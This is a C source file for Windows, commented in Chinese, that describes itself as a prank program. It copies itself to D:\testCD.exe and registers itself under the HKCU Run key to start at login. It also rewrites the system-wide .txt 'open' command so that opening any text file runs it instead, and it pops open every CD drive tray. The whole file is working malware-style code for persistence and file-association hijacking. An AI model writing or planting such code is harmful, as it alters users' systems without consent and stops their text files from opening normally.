#include <stdio.h>
#include <windows.h>

/*簡單介紹檔案關聯登錄檔
HKEY_CLASSES_ROOT下，掌握著整台電腦的檔案關聯；
(HKEY_CLASSES_ROOT\txtfile\shell\open\command)
HKEY_Current_User\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts(\.txt)下，儲存著個人的檔案關聯；

而個人的檔案關聯 優於 系統的檔案關聯！
參考:http://fireflybug.pixnet.net/blog/post/51054408-%E6%AA%94%E6%A1%88%E9%80%A3%E7%B5%90%E7%9A%84%E4%BF%AE%E6%94%B9--%E9%97%9C%E8%81%AF%E6%80%A7%E6%AA%94%E6%A1%88%E7%9A%84%E4%BF%AE%E6%94%B9
*/

char boot_hkey_path[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //設定路徑
char boot_value_name[] = "mytest";  //設定Value名稱
char boot_reg_data[] = "D:\\testCD.exe";
char file_rel_hkey_path[] = "txtfile\\shell\\open\\command"; //設定路徑

void DoorControl(char* driveLetter, BOOL open)
{
    char strCmd[100] = "set cdaudio!";
    strcat(strCmd, driveLetter);
    if(open == TRUE){
        strcat(strCmd, " door open");
    }else{
        strcat(strCmd, " door closed");
    }
    mciSendStringA(strCmd, "", 0, 0);
}

BOOL WriteToReg(HKEY hkey_root, char *hkey_path, char *value_name, DWORD type, char *reg_data){
    HKEY hKey;
    BOOL errorlevel;

    errorlevel = RegOpenKeyEx(hkey_root, hkey_path, 0, KEY_ALL_ACCESS, &hKey); //開啟機碼
    if(errorlevel) return FALSE;
    errorlevel = RegSetValueEx(hKey, value_name, 0, type, (CONST BYTE*)reg_data, strlen(reg_data)); //設定Value
    if(errorlevel) return FALSE;
    errorlevel = RegCloseKey(hKey); //卸除機碼
    if(errorlevel) return FALSE;

    return TRUE;
}

int main(){
    printf("This is a program which will play some tricks with you.....\n");
    const int BUFSIZE = 100;
    char buffer[ BUFSIZE ];

    //複製到D:
    GetModuleFileName(NULL, buffer, BUFSIZE);
    if(strcmp(buffer, boot_reg_data) != 0){
        if(!CopyFile("testCD.exe", boot_reg_data, FALSE)){
            printf("There is error while copying the file....\n");
            return -1;
        }
    }

    //增加開機啟動
    printf("Adding the booting option to registry\n");
    if(WriteToReg(HKEY_CURRENT_USER, boot_hkey_path, boot_value_name, REG_SZ, boot_reg_data))printf("Writing booting registry successfully");
    else printf("Fail to write booting registry\n");

    //增加txt檔案關聯
    printf("Adding the file relation to registry\n");
    if(WriteToReg(HKEY_CLASSES_ROOT, file_rel_hkey_path, NULL, REG_EXPAND_SZ, boot_reg_data))printf("Writing file relation registry successfully");
    else printf("Fail to write file relation registry\n");

    //找光碟機並且打開
    DWORD n = GetLogicalDriveStrings( BUFSIZE, buffer );
    DWORD i =  0;
    while( i < n )   {
        int t = GetDriveType( &buffer[i] );
        printf("%s type is %d\n", &buffer[i], t);
        if(t == 5)DoorControl(&buffer[i], TRUE);
        i += strlen( &buffer[i] ) + 1 ;
    }

    system("pause");
    return 0;
}
